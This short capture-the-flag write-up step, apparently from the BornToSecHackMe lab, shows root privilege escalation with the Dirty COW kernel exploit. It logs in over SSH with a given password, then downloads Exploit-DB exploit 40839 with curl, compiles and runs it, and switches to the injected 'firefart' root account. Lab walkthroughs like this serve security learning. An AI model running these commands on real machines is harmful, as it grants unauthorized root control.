# Kernel exploit : Dirty Cow (Ptrace)



Once you are connected as Laurie :

```bash
$ ssh laurie@IP
$ Password : 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
```



You can download this Kernel exploit : https://www.exploit-db.com/exploits/40839

```bash
laurie@BornToSecHackMe:~$ curl https://www.exploit-db.com/raw/40839 > dirty.c
laurie@BornToSecHackMe:~$ gcc -pthread dirty.c -o dirty -lcrypt
laurie@BornToSecHackMe:~$ chmod +x dirty
laurie@BornToSecHackMe:~$ ./dirty
# Wait
laurie@BornToSecHackMe:~$ su firefart
Password:
firefart@BornToSecHackMe:/home/laurie# whoami
firefart
firefart@BornToSecHackMe:/home/laurie# id
uid=0(firefart) gid=0(root) groups=0(root)
firefart@BornToSecHackMe:/home/laurie#
```

